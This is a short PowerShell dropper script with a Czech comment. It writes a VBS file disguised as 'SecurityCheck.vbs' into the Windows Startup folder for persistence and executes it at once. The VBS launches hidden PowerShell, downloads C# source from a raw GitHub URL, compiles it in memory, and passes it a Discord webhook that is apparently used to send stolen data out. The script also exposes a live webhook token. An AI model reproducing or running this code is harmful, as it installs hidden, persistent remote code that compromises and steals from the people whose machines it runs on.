$webhook = "https://discord.com/api/webhooks/1491728198092849215/DkCsPFapma_HMcUuG5GBIt6B9f55h99touvLjLOxvyLijuaTuZT15NO-xzYrJ78S2d2o"
$github = "https://raw.githubusercontent.com/jfheifohfai/diwidwidid/refs/heads/main/bot.cs"
$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\SecurityCheck.vbs"

# Kód pro VBS, který spustí PowerShell neviditelně
$vbsCode = @"
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell -WindowStyle Hidden -Command `$w='''$webhook'''; `$g='''$github'''; `$c=(iwr -UseBasicParsing `$g).Content; Add-Type -TypeDefinition `$c -ReferencedAssemblies '''System.Management''','''System.Net.Http''','''System.Drawing''','''System.Windows.Forms''','''System.IO'''; [Program]::Main(`$w)", 0, False
"@

[System.IO.File]::WriteAllText($startupPath, $vbsCode)

wscript.exe $startupPath
